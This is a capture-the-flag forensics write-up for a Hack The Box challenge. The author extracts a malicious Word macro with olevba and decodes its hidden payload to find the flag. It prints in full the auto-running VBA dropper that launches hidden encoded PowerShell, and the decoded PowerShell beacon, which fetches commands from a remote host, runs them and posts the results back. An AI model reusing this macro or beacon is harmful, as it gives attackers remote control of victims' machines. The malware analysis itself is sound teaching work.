# Forensics - Halloween Invitation

We have a  `invitation.docm` file and is to assume that we are dealing with some macros

to export all the files from the document I’ve used `olevba`

[`h](https://github.com/decalage2/oletools/wiki/olevba)[ttps://github.com/decalage2/oletools/wiki/olevba](Forensics%20-%20Halloween%20Invitation%2068c9467ed7404e0fbbd67ba869e5cd1c.md)`

With the first iteration of the command we can identify the project we’re interested and select it with

`olevba -s 4 <document>`

Once we get in we can see all the content from it, to extract VBA scripts we can run the following command

`olevba  --deobf --decocde --reveal`

What we get is the following script, after I cleaned up and changed some names

```java
Sub AutoOpen()
	DropIt
	Call test
End Sub
Private Sub DropIt()
	Dim dropbin As String
CreateObject("WScript.Shell").currentdirectory = "%TEMP%"
dropbin = sryivxjsdncj()
dropPath = "%TEMP%"
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(dropPath & "\history.bak", True)

objFile.Write dropbin
objFile.Close
End Sub

Private Function ParseBytes(strBytes) As String
	Dim aNumbers
	Dim dropbin As String
	Dim iIter
	dropbin = ""
	aNumbers = Split(strBytes)
	For iIter = LBound(aNumbers) To UBound(aNumbers)
		dropbin = dropbin + Chr(aNumbers(iIter))
	Next
	ParseBytes = dropbin
End Function

Private Function okbzichkqtto() As String
	Dim dropbin As String

	dropbin = ""
	dropbin = dropbin + ParseBytes("74 65 66 122 65 68 48 65 74 119 65 51 65 68 99 65 76 103 65 51 65 68 81 65 76 103")
	dropbin = dropbin + ParseBytes("65 120 65 68 107 65 79 65 65 117 65 68 85 65 77 103 65 54 65 68 103 65 77 65 65 52")
	dropbin = dropbin + ParseBytes("65 68 65 65 74 119 65 55 65 67 81 65 97 81 65 57 65 67 99 65 90 65 65 48 65 68 77")
	dropbin = dropbin + ParseBytes("65 89 103 66 106 65 71 77 65 78 103 66 107 65 67 48 65 77 65 65 48 65 68 77 65 90")
	dropbin = dropbin + ParseBytes("103 65 121 65 68 81 65 77 65 65 53 65 67 48 65 78 119 66 108 65 71 69 65 77 103 65")
	dropbin = dropbin + ParseBytes("122 65 71 69 65 77 103 66 106 65 67 99 65 79 119 65 107 65 72 65 65 80 81 65 110 65")
	dropbin = dropbin + ParseBytes("71 103 65 100 65 66 48 65 72 65 65 79 103 65 118 65 67 56 65 74 119 65 55 65 67 81")
	dropbin = dropbin + ParseBytes("65 100 103 65 57 65 69 107 65 98 103 66 50 65 71 56 65 97 119 66 108 65 67 48 65 85")
	dropbin = dropbin + ParseBytes("103 66 108 65 72 77 65 100 65 66 78 65 71 85 65 100 65 66 111 65 71 56 65 90 65 65")
	dropbin = dropbin + ParseBytes("103 65 67 48 65 86 81 66 122 65 71 85 65 81 103 66 104 65 72 77 65 97 81 66 106 65")
	dropbin = dropbin + ParseBytes("70 65 65 89 81 66 121 65 72 77 65 97 81 66 117 65 71 99 65 73 65 65 116 65 70 85 65")
	dropbin = dropbin + ParseBytes("99 103 66 112 65 67 65 65 74 65 66 119 65 67 81 65 99 119 65 118 65 71 81 65 78 65")
	dropbin = dropbin + ParseBytes("65 122 65 71 73 65 89 119 66 106 65 68 89 65 90 65 65 103 65 67 48 65 83 65 66 108")
	dropbin = dropbin + ParseBytes("65 71 69 65 90 65 66 108 65 72 73 65 99 119 65 103 65 69 65 65 101 119 65 105 65 69")
	dropbin = dropbin + ParseBytes("69 65 100 81 66 48 65 71 103 65 98 119 66 121 65 71 107 65 101 103 66 104 65 72 81")
	dropbin = dropbin + ParseBytes("65 97 81 66 118 65 71 52 65 73 103 65 57 65 67 81 65 97 81 66 57 65 68 115 65 100")
	dropbin = dropbin + ParseBytes("119 66 111 65 71 107 65 98 65 66 108 65 67 65 65 75 65 65 107 65 72 81 65 99 103 66")
	dropbin = dropbin + ParseBytes("49 65 71 85 65 75 81 66 55 65 67 81 65 89 119 65 57 65 67 103 65 83 81 66 117 65 72")
	dropbin = dropbin + ParseBytes("89 65 98 119 66 114 65 71 85 65 76 81 66 83 65 71 85 65 99 119 66 48 65 69 48 65 90")
	dropbin = dropbin + ParseBytes("81 66 48 65 71 103 65 98 119 66 107 65 67 65 65 76 81 66 86 65 72 77 65 90 81 66 67")
	dropbin = dropbin + ParseBytes("65 71 69 65 99 119 66 112 65 71 77 65 85 65 66 104 65 72 73 65 99 119 66 112 65 71")
	dropbin = dropbin + ParseBytes("52 65 90 119 65 103 65 67 48 65 86 81 66 121 65 71 107 65 73 65 65 107 65 72 65 65")
	dropbin = dropbin + ParseBytes("74 65 66 122 65 67 56 65 77 65 65 48 65 68 77 65 90 103 65 121 65 68 81 65 77 65 65")
	dropbin = dropbin + ParseBytes("53 65 67 65 65 76 81 66 73 65 71 85 65 89 81 66 107 65 71 85 65 99 103 66 122 65 67")
	dropbin = dropbin + ParseBytes("65 65 81 65 66 55 65 67 73 65 81 81 66 49 65 72 81 65 97 65 66 118 65 72 73 65 97")
	dropbin = dropbin + ParseBytes("81 66 54 65 71 69 65 100 65 66 112 65 71 56 65 98 103 65 105 65 68 48 65 74 65 66")
	dropbin = dropbin + ParseBytes("112 65 72 48 65 75 81 65 55 65 71 107 65 90 103 65 103 65 67 103 65 74 65 66 106 65")
	dropbin = dropbin + ParseBytes("67 65 65 76 81 66 117 65 71 85 65 73 65 65 110 65 69 52 65 98 119 66 117 65 71 85")
	dropbin = dropbin + ParseBytes("65 74 119 65 112 65 67 65 65 101 119 65 107 65 72 73 65 80 81 66 112 65 71 85 65 101")
	dropbin = dropbin + ParseBytes("65 65 103 65 67 81 65 89 119 65 103 65 67 48 65 82 81 66 121 65 72 73 65 98 119 66")
	dropbin = dropbin + ParseBytes("121 65 69 69 65 89 119 66 48 65 71 107 65 98 119 66 117 65 67 65 65 85 119 66 48 65")
	dropbin = dropbin + ParseBytes("71 56 65 99 65 65 103 65 67 48 65 82 81 66 121 65 72 73 65 98 119 66 121 65 70 89")
	dropbin = dropbin + ParseBytes("65 89 81 66 121 65 71 107 65 89 81 66 105 65 71 119 65 90 81 65 103 65 71 85 65 79")
	dropbin = dropbin + ParseBytes("119 65 107 65 72 73 65 80 81 66 80 65 72 85 65 100 65 65 116 65 70 77 65 100 65 66")
	dropbin = dropbin + ParseBytes("121 65 71 107 65 98 103 66 110 65 67 65 65 76 81 66 74 65 71 52 65 99 65 66 49 65")
	dropbin = dropbin + ParseBytes("72 81 65 84 119 66 105 65 71 111 65 90 81 66 106 65 72 81 65 73 65 65 107 65 72 73")
	dropbin = dropbin + ParseBytes("65 79 119 65 107 65 72 81 65 80 81 66 74 65 71 52 65 100 103 66 118 65 71 115 65 90")
	dropbin = dropbin + ParseBytes("81 65 116 65 70 73 65 90 81 66 122 65 72 81 65 84 81 66 108 65 72 81 65 97 65 66 118")
	dropbin = dropbin + ParseBytes("65 71 81 65 73 65 65 116 65 70 85 65 99 103 66 112 65 67 65 65 74 65 66 119 65 67")
	dropbin = dropbin + ParseBytes("81 65 99 119 65 118 65 68 99 65 90 81 66 104 65 68 73 65 77 119 66 104 65 68 73 65")
	dropbin = dropbin + ParseBytes("89 119 65 103 65 67 48 65 84 81 66 108 65 72 81 65 97 65 66 118 65 71 81 65 73 65")
	dropbin = dropbin + ParseBytes("66 81 65 69 56 65 85 119 66 85 65 67 65 65 76 81 66 73 65 71 85 65 89 81 66 107 65")
	dropbin = dropbin + ParseBytes("71 85 65 99 103 66 122 65 67 65 65 81 65 66 55 65 67 73 65 81 81 66 49 65 72 81 65")
	dropbin = dropbin + ParseBytes("97 65 66 118 65 72 73 65 97 81 66 54 65 71 69 65 100 65 66 112 65 71 56 65 98 103")
	dropbin = dropbin + ParseBytes("65 105 65 68 48 65 74 65 66 112 65 72 48 65 73 65 65 116 65 69 73 65 98 119 66 107")
	dropbin = dropbin + ParseBytes("65 72 107 65 73 65 65 111 65 70 115 65 85 119 66 53 65 72 77 65 100 65 66 108 65 71")
	dropbin = dropbin + ParseBytes("48 65 76 103 66 85 65 71 85 65 101 65 66 48 65 67 52 65 82 81 66 117 65 71 77 65 98")
	dropbin = dropbin + ParseBytes("119 66 107 65 71 107 65 98 103 66 110 65 70 48 65 79 103 65 54 65 70 85 65 86 65 66")
	dropbin = dropbin + ParseBytes("71 65 68 103 65 76 103 66 72 65 71 85 65 100 65 66 67 65 72 107 65 100 65 66 108 65")
	dropbin = dropbin + ParseBytes("72 77 65 75 65 65 107 65 71 85 65 75 119 65 107 65 72 73 65 75 81 65 103 65 67 48")
	dropbin = dropbin + ParseBytes("65 97 103 66 118 65 71 107 65 98 103 65 103 65 67 99 65 73 65 65 110 65 67 107 65")
	dropbin = dropbin + ParseBytes("102 81 65 103 65 72 77 65 98 65 66 108 65 71 85 65 99 65 65 103 65 68 65 65 76 103")
	dropbin = dropbin + ParseBytes("65 52 65 72 48 65 83 65 66 85 65 69 73 65 101 119 65 49 65 72 85 65 99 65 65 122 65")
	dropbin = dropbin + ParseBytes("72 73 65 88 119 65 122 65 68 81 65 78 81 66 53 65 70 56 65 98 81 65 48 65 71 77 65")
	dropbin = dropbin + ParseBytes("99 103 65 119 65 68 85 65 102 81 65 61")

	binary1 = dropbin
End Function

Private Function binary() As String
	Dim dropbin As String
	dropbin = ""
	dropbin = dropbin + binary1()
	binary = dropbin
End Function

Sub test()

	dropPath = "%TEMP%"
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objFile = objFSO.OpenTextFile(dropPath & "\history.bak")
	secret = objFile.ReadAll
	objFile.Close
	Code = "powershell -WindowStyle hidden -e """ & secret
	x = Shell(Code, 1)
End Sub

Attribute VB_Name = "Module1"

Function ParseBytes(ByVal k As String) As String
	Dim i As Long
	For i = 1 To Len(k) Step 2
	ParseBytes = ParseBytes & Chr$(Val("&H" & Mid$(k, i, 2)))
	Next i
End Function
```

There is a bunch of characters and we want to try to understand what they represent. Once I had an idea what to do, reading some old CTFs i went over to cyberchef and got all the data from the script cleaned up with just the numbers. After some thinking i figure it was decimal and had it decoded to utf-8

`74 65 66 122 65 68 48 65 74 119 65 51 65 68 99 65 76 103 65 51 65 68 81 65 76 103
65 120 65 68 107 65 79 65 65 117 65 68 85 65 77 103 65 54 65 68 103 65 77 65 65 52
65 68 65 65 74 119 65 55 65 67 81 65 97 81 65 57 65 67 99 65 90 65 65 48 65 68 77
65 89 103 66 106 65 71 77 65 78 103 66 107 65 67 48 65 77 65 65 48 65 68 77 65 90
103 65 121 65 68 81 65 77 65 65 53 65 67 48 65 78 119 66 108 65 71 69 65 77 103 65
122 65 71 69 65 77 103 66 106 65 67 99 65 79 119 65 107 65 72 65 65 80 81 65 110 65
71 103 65 100 65 66 48 65 72 65 65 79 103 65 118 65 67 56 65 74 119 65 55 65 67 81
65 100 103 65 57 65 69 107 65 98 103 66 50 65 71 56 65 97 119 66 108 65 67 48 65 85
103 66 108 65 72 77 65 100 65 66 78 65 71 85 65 100 65 66 111 65 71 56 65 90 65 65
103 65 67 48 65 86 81 66 122 65 71 85 65 81 103 66 104 65 72 77 65 97 81 66 106 65
70 65 65 89 81 66 121 65 72 77 65 97 81 66 117 65 71 99 65 73 65 65 116 65 70 85 65
99 103 66 112 65 67 65 65 74 65 66 119 65 67 81 65 99 119 65 118 65 71 81 65 78 65
65 122 65 71 73 65 89 119 66 106 65 68 89 65 90 65 65 103 65 67 48 65 83 65 66 108
65 71 69 65 90 65 66 108 65 72 73 65 99 119 65 103 65 69 65 65 101 119 65 105 65 69
69 65 100 81 66 48 65 71 103 65 98 119 66 121 65 71 107 65 101 103 66 104 65 72 81
65 97 81 66 118 65 71 52 65 73 103 65 57 65 67 81 65 97 81 66 57 65 68 115 65 100
119 66 111 65 71 107 65 98 65 66 108 65 67 65 65 75 65 65 107 65 72 81 65 99 103 66
49 65 71 85 65 75 81 66 55 65 67 81 65 89 119 65 57 65 67 103 65 83 81 66 117 65 72
89 65 98 119 66 114 65 71 85 65 76 81 66 83 65 71 85 65 99 119 66 48 65 69 48 65 90
81 66 48 65 71 103 65 98 119 66 107 65 67 65 65 76 81 66 86 65 72 77 65 90 81 66 67
65 71 69 65 99 119 66 112 65 71 77 65 85 65 66 104 65 72 73 65 99 119 66 112 65 71
52 65 90 119 65 103 65 67 48 65 86 81 66 121 65 71 107 65 73 65 65 107 65 72 65 65
74 65 66 122 65 67 56 65 77 65 65 48 65 68 77 65 90 103 65 121 65 68 81 65 77 65 65
53 65 67 65 65 76 81 66 73 65 71 85 65 89 81 66 107 65 71 85 65 99 103 66 122 65 67
65 65 81 65 66 55 65 67 73 65 81 81 66 49 65 72 81 65 97 65 66 118 65 72 73 65 97
81 66 54 65 71 69 65 100 65 66 112 65 71 56 65 98 103 65 105 65 68 48 65 74 65 66
112 65 72 48 65 75 81 65 55 65 71 107 65 90 103 65 103 65 67 103 65 74 65 66 106 65
67 65 65 76 81 66 117 65 71 85 65 73 65 65 110 65 69 52 65 98 119 66 117 65 71 85
65 74 119 65 112 65 67 65 65 101 119 65 107 65 72 73 65 80 81 66 112 65 71 85 65 101
65 65 103 65 67 81 65 89 119 65 103 65 67 48 65 82 81 66 121 65 72 73 65 98 119 66
121 65 69 69 65 89 119 66 48 65 71 107 65 98 119 66 117 65 67 65 65 85 119 66 48 65
71 56 65 99 65 65 103 65 67 48 65 82 81 66 121 65 72 73 65 98 119 66 121 65 70 89
65 89 81 66 121 65 71 107 65 89 81 66 105 65 71 119 65 90 81 65 103 65 71 85 65 79
119 65 107 65 72 73 65 80 81 66 80 65 72 85 65 100 65 65 116 65 70 77 65 100 65 66
121 65 71 107 65 98 103 66 110 65 67 65 65 76 81 66 74 65 71 52 65 99 65 66 49 65
72 81 65 84 119 66 105 65 71 111 65 90 81 66 106 65 72 81 65 73 65 65 107 65 72 73
65 79 119 65 107 65 72 81 65 80 81 66 74 65 71 52 65 100 103 66 118 65 71 115 65 90
81 65 116 65 70 73 65 90 81 66 122 65 72 81 65 84 81 66 108 65 72 81 65 97 65 66 118
65 71 81 65 73 65 65 116 65 70 85 65 99 103 66 112 65 67 65 65 74 65 66 119 65 67
81 65 99 119 65 118 65 68 99 65 90 81 66 104 65 68 73 65 77 119 66 104 65 68 73 65
89 119 65 103 65 67 48 65 84 81 66 108 65 72 81 65 97 65 66 118 65 71 81 65 73 65
66 81 65 69 56 65 85 119 66 85 65 67 65 65 76 81 66 73 65 71 85 65 89 81 66 107 65
71 85 65 99 103 66 122 65 67 65 65 81 65 66 55 65 67 73 65 81 81 66 49 65 72 81 65
97 65 66 118 65 72 73 65 97 81 66 54 65 71 69 65 100 65 66 112 65 71 56 65 98 103
65 105 65 68 48 65 74 65 66 112 65 72 48 65 73 65 65 116 65 69 73 65 98 119 66 107
65 72 107 65 73 65 65 111 65 70 115 65 85 119 66 53 65 72 77 65 100 65 66 108 65 71
48 65 76 103 66 85 65 71 85 65 101 65 66 48 65 67 52 65 82 81 66 117 65 71 77 65 98
119 66 107 65 71 107 65 98 103 66 110 65 70 48 65 79 103 65 54 65 70 85 65 86 65 66
71 65 68 103 65 76 103 66 72 65 71 85 65 100 65 66 67 65 72 107 65 100 65 66 108 65
72 77 65 75 65 65 107 65 71 85 65 75 119 65 107 65 72 73 65 75 81 65 103 65 67 48
65 97 103 66 118 65 71 107 65 98 103 65 103 65 67 99 65 73 65 65 110 65 67 107 65
102 81 65 103 65 72 77 65 98 65 66 108 65 71 85 65 99 65 65 103 65 68 65 65 76 103
65 52 65 72 48 65 83 65 66 85 65 69 73 65 101 119 65 49 65 72 85 65 99 65 65 122 65
72 73 65 88 119 65 122 65 68 81 65 78 81 66 53 65 70 56 65 98 81 65 48 65 71 77 65
99 103 65 119 65 68 85 65 102 81 65 61`

To decode I’ve used the following website

[https://onlineutf8tools.com/convert-decimal-to-utf8](https://onlineutf8tools.com/convert-decimal-to-utf8)

Where we have the following result 

`JABzAD0AJwA3ADcALgA3ADQALgAxADkAOAAuADUAMgA6ADgAMAA4ADAAJwA7ACQAaQA9ACcAZAA0ADMAYgBjAGMANgBkAC0AMAA0ADMAZgAyADQAMAA5AC0ANwBlAGEAMgAzAGEAMgBjACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvAGQANAAzAGIAYwBjADYAZAAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAaQB9ADsAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQB7ACQAYwA9ACgASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIAAkAHAAJABzAC8AMAA0ADMAZgAyADQAMAA5ACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AKQA7AGkAZgAgACgAJABjACAALQBuAGUAIAAnAE4AbwBuAGUAJwApACAAewAkAHIAPQBpAGUAeAAgACQAYwAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwB0AG8AcAAgAC0ARQByAHIAbwByAFYAYQByAGkAYQBiAGwAZQAgAGUAOwAkAHIAPQBPAHUAdAAtAFMAdAByAGkAbgBnACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHIAOwAkAHQAPQBJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAJABwACQAcwAvADcAZQBhADIAMwBhADIAYwAgAC0ATQBlAHQAaABvAGQAIABQAE8AUwBUACAALQBIAGUAYQBkAGUAcgBzACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJABpAH0AIAAtAEIAbwBkAHkAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGUAKwAkAHIAKQAgAC0AagBvAGkAbgAgACcAIAAnACkAfQAgAHMAbABlAGUAcAAgADAALgA4AH0ASABUAEIAewA1AHUAcAAzAHIAXwAzADQANQB5AF8AbQA0AGMAcgAwADUAfQA=`

Well, well looks like base64 right?
Getting back to cyberchef and let it do its magic decoding from base64 we got the following output:

`$.s.=.'.7.7...7.4...1.9.8...5.2.:.8.0.8.0.'.;.$.i.=.'.d.4.3.b.c.c.6.d.-.0.4.3.f.2.4.0.9.-.7.e.a.2.3.a.2.c.'.;.$.p.=.'.h.t.t.p.:././.'.;.$.v.=.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.s.e.B.a.s.i.c.P.a.r.s.i.n.g. .-.U.r.i. .$.p.$.s./.d.4.3.b.c.c.6.d. .-.H.e.a.d.e.r.s. .@.{.".A.u.t.h.o.r.i.z.a.t.i.o.n.".=.$.i.}.;.w.h.i.l.e. .(.$.t.r.u.e.).{.$.c.=.(.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.s.e.B.a.s.i.c.P.a.r.s.i.n.g. .-.U.r.i. .$.p.$.s./.0.4.3.f.2.4.0.9. .-.H.e.a.d.e.r.s. .@.{.".A.u.t.h.o.r.i.z.a.t.i.o.n.".=.$.i.}.).;.i.f. .(.$.c. .-.n.e. .'.N.o.n.e.'.). .{.$.r.=.i.e.x. .$.c. .-.E.r.r.o.r.A.c.t.i.o.n. .S.t.o.p. .-.E.r.r.o.r.V.a.r.i.a.b.l.e. .e.;.$.r.=.O.u.t.-.S.t.r.i.n.g. .-.I.n.p.u.t.O.b.j.e.c.t. .$.r.;.$.t.=.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.r.i. .$.p.$.s./.7.e.a.2.3.a.2.c. .-.M.e.t.h.o.d. .P.O.S.T. .-.H.e.a.d.e.r.s. .@.{.".A.u.t.h.o.r.i.z.a.t.i.o.n.".=.$.i.}. .-.B.o.d.y. .(.[.S.y.s.t.e.m...T.e.x.t...E.n.c.o.d.i.n.g.].:.:.U.T.F.8...G.e.t.B.y.t.e.s.(.$.e.+.$.r.). .-.j.o.i.n. .'. .'.).}. .s.l.e.e.p. .0...8.}.H.T.B.{.5.u.p.3.r.*.3.4.5.y.*.m.4.c.r.0.5.}.`

`$s='777419852:8080';$i='d43bcc6d-043f2409-7ea23a2c';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/d43bcc6d -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/043f2409 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/7ea23a2c -Method POST -Headers @{"Authorization"=$i} -Body ([SystemTextEncoding]::UTF8GetBytes($e+$r) -join ' ')} sleep 08}HTB{5up3r345ym4cr05}`

Looking closely to the end of the decoded script we see something familiar right?

Voila, there is our flag and the challenge has been completed

## The flag is: `HTB{5up3r_345y_m4cr05}`
